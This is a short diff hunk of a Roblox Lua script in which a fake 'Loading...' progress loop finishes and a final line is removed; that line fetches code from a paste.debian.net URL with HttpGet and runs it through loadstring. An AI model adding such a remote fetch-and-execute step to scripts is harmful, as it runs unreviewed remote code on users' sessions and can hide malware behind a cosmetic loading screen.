@@ -111,5 +111,3 @@ for o = 1, 100 do
     task.wait(0.1)
 end
 m.Text = "Loading... 100%"
-
-loadstring(game:HttpGet("https://paste.debian.net/plainh/3886e39f/", true))()
